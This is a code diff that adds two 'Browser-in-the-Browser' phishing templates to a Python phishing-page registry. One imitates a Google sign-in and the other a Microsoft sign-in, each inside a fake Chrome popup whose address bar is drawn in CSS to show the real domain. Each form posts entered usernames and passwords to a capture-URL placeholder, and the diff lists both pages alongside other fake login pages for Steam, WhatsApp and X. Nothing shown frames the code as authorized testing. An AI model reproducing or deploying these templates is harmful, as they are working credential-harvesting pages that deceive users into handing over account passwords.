@@ -608,6 +608,244 @@ STEAM_LOGIN = """<!DOCTYPE html>
 </html>"""
 
 
+# ─────────────────────────────────────────────────────────────────────────────
+# BROWSER-IN-THE-BROWSER (BitB) — Google
+# Simulates a Chrome popup window overlaid on an attacker page.
+# User sees "accounts.google.com" in the address bar — pure CSS trick.
+# ─────────────────────────────────────────────────────────────────────────────
+BITB_GOOGLE = """<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Continue with Google</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f0f4f8;min-height:100vh;display:flex;align-items:center;justify-content:center}
+.bg-site{position:fixed;inset:0;background:#f0f4f8;display:flex;align-items:center;justify-content:center;flex-direction:column;gap:16px}
+.bg-logo{font-size:28px;font-weight:700;color:#1a73e8;letter-spacing:-1px}
+.bg-text{font-size:15px;color:#5f6368}
+.overlay{position:fixed;inset:0;background:rgba(0,0,0,.45);z-index:100;backdrop-filter:blur(2px)}
+.popup{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);z-index:200;width:470px;border-radius:10px;box-shadow:0 24px 80px rgba(0,0,0,.55);overflow:hidden;background:#fff}
+/* Chrome title bar */
+.c-titlebar{background:#dee1e6;padding:8px 0 0;position:relative;user-select:none}
+/* Tabs */
+.c-tabs{display:flex;align-items:flex-end;padding:0 8px}
+.c-tab{background:#fff;border-radius:8px 8px 0 0;padding:7px 12px 6px;display:flex;align-items:center;gap:8px;font-size:12px;color:#3c4043;min-width:0;max-width:200px}
+.c-tab img{width:15px;height:15px;flex-shrink:0}
+.c-tab-title{overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.c-tab-x{margin-left:6px;width:16px;height:16px;border-radius:50%;display:flex;align-items:center;justify-content:center;color:#80868b;font-size:14px;flex-shrink:0}
+.c-tab-x:hover{background:#e8eaed}
+/* Window controls (Windows style, right side) */
+.c-winctrl{position:absolute;top:0;right:0;display:flex}
+.c-winbtn{width:46px;height:32px;display:flex;align-items:center;justify-content:center;font-size:13px;color:#3c4043;cursor:default}
+.c-winbtn:hover{background:rgba(0,0,0,.08)}
+.c-winbtn.close{background:#c42b1c;color:#fff}
+.c-winbtn.close:hover{background:#b01f14}
+/* Address bar */
+.c-navbar{background:#fff;padding:6px 10px;display:flex;align-items:center;gap:6px;border-bottom:1px solid #e0e0e0}
+.c-navbtn{width:28px;height:28px;border-radius:50%;display:flex;align-items:center;justify-content:center;color:#9aa0a6;font-size:16px;cursor:default;flex-shrink:0}
+.c-navbtn:hover{background:#f1f3f4}
+.c-urlbar{flex:1;background:#f1f3f4;border-radius:20px;padding:5px 14px;display:flex;align-items:center;gap:6px;font-size:13px;cursor:text}
+.c-lock{color:#188038;font-size:11px}
+.c-url{color:#202124}
+/* Content */
+.popup-body{font-family:'Google Sans',Roboto,sans-serif;color:#202124}
+.popup-inner{max-width:380px;margin:0 auto;padding:40px 40px 32px}
+.g-logo{text-align:center;margin-bottom:20px}
+.g-logo img{height:24px}
+h1{font-size:24px;font-weight:400;text-align:center;margin-bottom:8px}
+.subtitle{font-size:15px;text-align:center;color:#202124;margin-bottom:28px}
+.field{position:relative;margin-bottom:20px}
+.field input{width:100%;padding:14px 14px 14px;border:1px solid #dadce0;border-radius:4px;font-size:16px;outline:none;background:#fff}
+.field input:focus{border-color:#1a73e8;border-width:2px;padding:13px 13px 13px}
+.field label{position:absolute;top:-9px;left:10px;background:#fff;padding:0 4px;font-size:12px;color:#1a73e8}
+.forgot{font-size:14px;color:#1a73e8;text-decoration:none}
+.actions{display:flex;justify-content:space-between;align-items:center;margin-top:28px}
+.create{font-size:14px;color:#1a73e8;text-decoration:none}
+.btn-next{background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:10px 24px;font-size:14px;font-weight:500;cursor:pointer}
+.btn-next:hover{background:#1557b0}
+.divhr{border:none;border-top:1px solid #e0e0e0;margin:24px 0}
+.footer{text-align:center;font-size:12px;color:#5f6368}
+</style>
+</head>
+<body>
+<div class="bg-site">
+  <div class="bg-logo">Your Portal</div>
+  <div class="bg-text">Sign in to continue to your account</div>
+  <button onclick="document.querySelector('.overlay').style.display='flex';document.querySelector('.popup').style.display='block'"
+    style="background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:12px 28px;font-size:15px;font-weight:500;cursor:pointer;margin-top:8px">
+    Continue with Google
+  </button>
+</div>
+<div class="overlay"></div>
+<div class="popup">
+  <div class="c-titlebar">
+    <div class="c-tabs">
+      <div class="c-tab">
+        <img src="https://www.google.com/favicon.ico" onerror="this.style.display='none'">
+        <span class="c-tab-title">Sign in – Google Accounts</span>
+        <div class="c-tab-x">×</div>
+      </div>
+    </div>
+    <div class="c-winctrl">
+      <div class="c-winbtn">&#8722;</div>
+      <div class="c-winbtn">&#9633;</div>
+      <div class="c-winbtn close">&#x2715;</div>
+    </div>
+  </div>
+  <div class="c-navbar">
+    <div class="c-navbtn">&#8592;</div>
+    <div class="c-navbtn" style="color:#c5c7ca">&#8594;</div>
+    <div class="c-navbtn">&#8635;</div>
+    <div class="c-urlbar">
+      <span class="c-lock">🔒</span>
+      <span class="c-url">accounts.google.com</span>
+    </div>
+    <div class="c-navbtn">&#8942;</div>
+  </div>
+  <div class="popup-body">
+    <div class="popup-inner">
+      <div class="g-logo">
+        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_160x56dp.png" alt="Google">
+      </div>
+      <h1>Anmelden</h1>
+      <p class="subtitle">Mit Ihrem Google-Konto fortfahren</p>
+      <form method="POST" action="{{CAPTURE_URL}}">
+        <input type="hidden" name="{{CSRF_FIELD}}" value="{{CSRF_TOKEN}}">
+        <div class="field">
+          <label>E-Mail oder Telefon</label>
+          <input type="email" name="username" autocomplete="email" required autofocus>
+        </div>
+        <div class="field">
+          <label>Passwort</label>
+          <input type="password" name="password" autocomplete="current-password" required>
+        </div>
+        <a href="#" class="forgot">Passwort vergessen?</a>
+        <div class="actions">
+          <a href="#" class="create">Konto erstellen</a>
+          <button type="submit" class="btn-next">Weiter</button>
+        </div>
+      </form>
+      <hr class="divhr">
+      <p class="footer">Deutsch ▾ &nbsp; Hilfe &nbsp; Datenschutz &nbsp; Nutzungsbedingungen</p>
+    </div>
+  </div>
+</div>
+</body>
+</html>"""
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# BROWSER-IN-THE-BROWSER (BitB) — Microsoft
+# ─────────────────────────────────────────────────────────────────────────────
+BITB_MICROSOFT = """<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Sign in with Microsoft</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:'Segoe UI',sans-serif;background:#f3f2f1;min-height:100vh;display:flex;align-items:center;justify-content:center}
+.bg-site{position:fixed;inset:0;background:#f3f2f1;display:flex;align-items:center;justify-content:center;flex-direction:column;gap:16px}
+.overlay{position:fixed;inset:0;background:rgba(0,0,0,.45);z-index:100;backdrop-filter:blur(2px)}
+.popup{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);z-index:200;width:470px;border-radius:10px;box-shadow:0 24px 80px rgba(0,0,0,.55);overflow:hidden;background:#fff}
+.c-titlebar{background:#dee1e6;padding:8px 0 0;position:relative;user-select:none}
+.c-tabs{display:flex;align-items:flex-end;padding:0 8px}
+.c-tab{background:#fff;border-radius:8px 8px 0 0;padding:7px 12px 6px;display:flex;align-items:center;gap:8px;font-size:12px;color:#3c4043;min-width:0;max-width:220px}
+.c-tab img{width:15px;height:15px;flex-shrink:0}
+.c-tab-title{overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.c-tab-x{margin-left:6px;width:16px;height:16px;border-radius:50%;display:flex;align-items:center;justify-content:center;color:#80868b;font-size:14px;flex-shrink:0}
+.c-winctrl{position:absolute;top:0;right:0;display:flex}
+.c-winbtn{width:46px;height:32px;display:flex;align-items:center;justify-content:center;font-size:13px;color:#3c4043;cursor:default}
+.c-winbtn:hover{background:rgba(0,0,0,.08)}
+.c-winbtn.close{background:#c42b1c;color:#fff}
+.c-winbtn.close:hover{background:#b01f14}
+.c-navbar{background:#fff;padding:6px 10px;display:flex;align-items:center;gap:6px;border-bottom:1px solid #e0e0e0}
+.c-navbtn{width:28px;height:28px;border-radius:50%;display:flex;align-items:center;justify-content:center;color:#9aa0a6;font-size:16px;cursor:default;flex-shrink:0}
+.c-urlbar{flex:1;background:#f1f3f4;border-radius:20px;padding:5px 14px;display:flex;align-items:center;gap:6px;font-size:13px}
+.c-lock{color:#188038;font-size:11px}
+.popup-body{padding:44px}
+.ms-logo img{height:21px;margin-bottom:18px}
+h1{font-size:24px;font-weight:600;margin-bottom:16px;color:#1b1b1b}
+.field{margin-bottom:14px}
+.field input{width:100%;padding:8px 0;border:none;border-bottom:1px solid #767676;font-size:15px;outline:none;background:transparent;font-family:'Segoe UI',sans-serif}
+.field input:focus{border-bottom:2px solid #0067b8}
+.hint{font-size:13px;color:#666;margin-bottom:24px}
+.hint a{color:#0067b8;text-decoration:none}
+.btn{background:#0067b8;color:#fff;border:none;width:100%;padding:12px;font-size:15px;font-weight:600;cursor:pointer;font-family:'Segoe UI',sans-serif}
+.btn:hover{background:#005a9e}
+.opts{margin-top:14px;font-size:13px}
+.opts a{color:#0067b8;text-decoration:none;display:block;margin-bottom:8px}
+.footer{margin-top:20px;font-size:11px;color:#666}
+.footer a{color:#0067b8;text-decoration:none;margin-right:10px}
+</style>
+</head>
+<body>
+<div class="bg-site">
+  <img src="https://c.s-microsoft.com/en-us/CMSImages/mslogo.png" style="height:24px" alt="Microsoft">
+  <p style="font-size:15px;color:#333;margin-top:12px">Melden Sie sich an, um fortzufahren</p>
+  <button onclick="document.querySelector('.overlay').style.display='flex';document.querySelector('.popup').style.display='block'"
+    style="background:#0067b8;color:#fff;border:none;padding:11px 24px;font-size:14px;font-weight:600;cursor:pointer;margin-top:8px;font-family:'Segoe UI',sans-serif">
+    Mit Microsoft anmelden
+  </button>
+</div>
+<div class="overlay"></div>
+<div class="popup">
+  <div class="c-titlebar">
+    <div class="c-tabs">
+      <div class="c-tab">
+        <img src="https://c.s-microsoft.com/favicon.ico" onerror="this.style.display='none'">
+        <span class="c-tab-title">Anmelden bei Ihrem Microsoft-Konto</span>
+        <div class="c-tab-x">×</div>
+      </div>
+    </div>
+    <div class="c-winctrl">
+      <div class="c-winbtn">&#8722;</div>
+      <div class="c-winbtn">&#9633;</div>
+      <div class="c-winbtn close">&#x2715;</div>
+    </div>
+  </div>
+  <div class="c-navbar">
+    <div class="c-navbtn">&#8592;</div>
+    <div class="c-navbtn" style="color:#c5c7ca">&#8594;</div>
+    <div class="c-navbtn">&#8635;</div>
+    <div class="c-urlbar">
+      <span class="c-lock">🔒</span>
+      <span style="color:#202124;font-size:13px">login.microsoftonline.com</span>
+    </div>
+    <div class="c-navbtn">&#8942;</div>
+  </div>
+  <div class="popup-body">
+    <div class="ms-logo">
+      <img src="https://c.s-microsoft.com/en-us/CMSImages/mslogo.png" alt="Microsoft">
+    </div>
+    <h1>Anmelden</h1>
+    <form method="POST" action="{{CAPTURE_URL}}">
+      <input type="hidden" name="{{CSRF_FIELD}}" value="{{CSRF_TOKEN}}">
+      <div class="field">
+        <input type="email" name="username" placeholder="E-Mail, Telefon oder Skype" required autofocus>
+      </div>
+      <div class="field">
+        <input type="password" name="password" placeholder="Kennwort" required>
+      </div>
+      <p class="hint">Kein Konto? <a href="#">Jetzt erstellen!</a></p>
+      <button type="submit" class="btn">Anmelden</button>
+    </form>
+    <div class="opts">
+      <a href="#">Anmeldeoptionen</a>
+    </div>
+    <div class="footer">
+      <a href="#">Datenschutz</a>
+      <a href="#">Nutzungsbedingungen</a>
+    </div>
+  </div>
+</div>
+</body>
+</html>"""
+
+
 # Registry
 # ─────────────────────────────────────────────────────────────────────────────
 PAGES: dict[str, str] = {
@@ -622,6 +860,8 @@ PAGES: dict[str, str] = {
     "twitter":   TWITTER_LOGIN,
     "whatsapp":  WHATSAPP_LOGIN,
     "steam":     STEAM_LOGIN,
+    "bitb-google":    BITB_GOOGLE,
+    "bitb-microsoft": BITB_MICROSOFT,
 }
 
 PAGE_DESCRIPTIONS: dict[str, str] = {
@@ -635,7 +875,9 @@ PAGE_DESCRIPTIONS: dict[str, str] = {
     "discord":   "Discord — Dark Mode Login",
     "twitter":   "X / Twitter — schwarzes Design",
     "whatsapp":  "WhatsApp Web — Verifikations-Trick",
-    "steam":     "Steam — Gaming-Account",
+    "steam":          "Steam — Gaming-Account",
+    "bitb-google":    "BitB Google — Fake Chrome-Popup mit accounts.google.com in Adressleiste",
+    "bitb-microsoft": "BitB Microsoft — Fake Chrome-Popup mit login.microsoftonline.com",
 }
 
 
